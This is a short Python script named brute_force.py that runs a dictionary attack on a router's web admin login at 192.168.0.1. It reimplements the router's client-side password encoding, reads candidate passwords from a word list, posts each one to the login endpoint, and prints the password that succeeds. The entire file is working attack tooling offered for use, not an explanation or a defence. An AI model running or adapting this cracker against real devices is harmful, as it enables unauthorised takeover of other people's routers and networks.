#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/8/5 11:02
# @Author  : Huyd
# @Site    : 
# @File    : brute_force.py
# @Software: PyCharm

import requests
import time
from base64 import b64encode


def security_encode(b):
    a = 'RDpbLfCPsJZ7fiv'
    c = 'yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW'

    e = ''
    g = len(a)
    h = len(b)
    k = len(c)

    f = g if g > h else h
    for p in range(f):
        n = l = 187
        if p >= g:
            n = ord(b[p])
        elif p >= h:
            l = ord(a[p])
        else:
            l = ord(a[p])
            n = ord(b[p])
        e += c[((l ^ n) % k)]
    return e


# TODO: slower!
def new_login(password):
    time.sleep(1)
    # s = requests.session()
    s.get('http://192.168.0.1', headers={'Content-Type': 'application/json'})
    r = s.post('http://192.168.0.1', json={"method": "do", "login": {"password": security_encode(password)}})
    print('trying `%s`...%d' % (password, r.status_code))
    if r.status_code == 200:
        return True, 'the password is %s' % password
    else:
        return False, -1


def new_crack():
    with open('1.txt', 'r') as f:
        while True:
            line = f.readline()
            if len(line) == 0:
                break
            else:
                result, msg = new_login(line.rstrip('\n'))
                if result:
                    return msg


def test_security_encode():
    assert '0KcgeXhc9TefbwK' == security_encode('123456')


if __name__ == '__main__':
    s = requests.session()
    print(new_crack())
